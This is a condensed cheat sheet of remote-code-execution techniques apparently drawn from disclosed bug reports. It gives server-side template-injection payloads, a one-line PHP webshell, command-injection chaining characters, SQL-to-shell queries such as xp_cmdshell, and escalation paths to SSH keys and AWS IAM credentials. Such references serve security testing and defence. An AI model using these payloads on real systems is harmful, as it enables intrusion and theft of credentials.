# RCE Exploitation Patterns from Disclosed Reports

## Pattern 1: Deserialization → RCE

**Java:** ysoserial with CommonsCollections/Spring gadgets
**Python:** pickle deserialization, PyYAML unsafe_load
**PHP:** unserialize() on user-controlled data
**.NET:** BinaryFormatter, LosFormatter
**Ruby:** Marshal.load, YAML.load

---

## Pattern 2: SSTI → RCE

**Jinja2 (Python):**
```python
{{ ''.__class__.__mro__[2].__subclasses__() }}
# Find subprocess.Popen → execute commands
```

**FreeMarker (Java):**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

---

## Pattern 3: File Upload → RCE

- PHP webshell: `<?php system($_GET['cmd']); ?>` → uploaded as `.php`
- .htaccess override + .jpg as PHP
- SVG with embedded JavaScript (server-side processing)
- XXE in DOCX/XLSX → SSRF → RCE
- ImageTragick (ImageMagick CVE)

---

## Pattern 4: Command Injection → RCE

**Common sinks:** `system()`, `exec()`, `popen()`, `shell_exec()`, `passthru()`
**Chaining:** `|`, `;`, `&&`, `||`, `\n`, `$(cmd)`, `` `cmd` ``

---

## Pattern 5: SQLi → RCE

- MySQL: `SELECT ... INTO OUTFILE '/var/www/shell.php'`
- MSSQL: `xp_cmdshell 'command'`
- PostgreSQL: `COPY (SELECT '') TO PROGRAM 'command'`
- Oracle: `UTL_HTTP.REQUEST` + `DBMS_JAVA`

---

## Common RCE Escalation Paths

```
Web Shell → Reverse Shell → Privilege Escalation → Lateral Movement
OR
RCE → Read /etc/passwd → NFS share → SSH keys
OR
RCE → AWS metadata → IAM credentials → S3/EC2 access
```
